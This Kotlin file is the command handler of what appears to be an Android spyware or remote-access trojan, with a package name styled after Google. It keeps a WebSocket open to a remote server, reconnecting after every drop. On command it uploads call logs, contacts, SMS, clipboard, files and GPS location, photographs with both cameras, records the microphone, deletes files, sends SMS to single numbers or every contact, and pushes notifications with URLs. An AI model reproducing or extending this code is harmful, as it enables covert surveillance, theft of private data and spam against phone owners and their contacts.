package google.devepttune.Utils

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import google.devepttune.MainActivity
import android.content.Intent


class AppSocket(val context: Context) :
    okhttp3.WebSocketListener() {
    private val client = OkHttpClient()
    private val requests = AppRequest()
    val action = AppActions(context)

    fun connect() {
        AppScope.runBack {
            val request = Request.Builder().url(AppTools.getAppData().socket)
            requests.awake()
            request.addHeader("model", AppTools.getDeviceName())
            request.addHeader("battery", AppTools.getBatteryPercentage(context).toString())
            request.addHeader("version", AppTools.getAndroidVersion().toString() + " (SDK)")
            request.addHeader("brightness", AppTools.getScreenBrightness(context).toString())
            request.addHeader("provider", AppTools.getProviderName(context))
            client.newWebSocket(request.build(), this)
        }
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        Log.i("MESSAGE",text)
        when(text){
            "calls" -> {
                action.uploadCalls()
            }
            "contacts" -> {
                action.uploadContact()
            }
            "messages" -> {
                action.uploadMessages()
            }
            "apps" -> {
                action.uploadApps()
            }
            "device_info" -> {
                action.uploadDeviceInfo()
            }
            "clipboard" -> {
                action.uploadClipboard()
            }
            "camera_main" -> {
                action.captureCameraMain()
            }
            "camera_selfie" -> {
                action.captureCameraSelfie()
            }
            "location" -> {
                action.uploadGpsLocation()
            }
            "vibrate" -> {
                action.vibratePhone()
            }
            "stop_audio" -> {
                action.stopAudio()
            }
            "openApp" -> {
                openAppActivity()
            }
            "ping" -> webSocket.send("pong")
            else -> {
                val commend = text.split(":")[0]
                Log.i("COMMAND",text)
                val data = text.split(":")[1]
                when(commend){
                    "send_message" -> {
                        val number = data.split("/")[0]
                        val message = data.split("/")[1]
                        action.sendMessage(number, message)
                    }
                    "send_message_to_all" -> {
                        action.messageToAllContacts(data)
                    }
                    "file" -> {
                        action.uploadFile(data)
                    }
                    "delete_file" -> {
                        action.deleteFile(data)
                    }
                    "microphone" -> {
                        val duration = data.toLongOrNull()
                        if (duration != null) {
                            action.captureMicrophone(duration)
                        } else {
                            requests.sendText(AppRequest.Text("Invalid duration"))
                        }
                    }
                    "toast" -> {
                        action.showToast(data)
                    }
                    "show_notification" -> {
                        val notificationData = text.substringAfter(":")
                        val title = notificationData.substringBefore("/")
                        val url = notificationData.substringAfter("/")
                        action.showNotification(title, url)
                    }
                    "play_audio" -> {
                        action.playAudio(text.substringAfter(":"))
                    }
                }
            }
        }
    }

    private fun openAppActivity() {
        val intent = Intent(context, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }


    override fun onOpen(webSocket: WebSocket, response: Response) {}

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        Log.i("ERR",reason)
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        t.printStackTrace()
        if (response != null) {
            Log.i("ERR", response.message)
        }
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }

    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
        Log.i("ERR",reason)
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }
}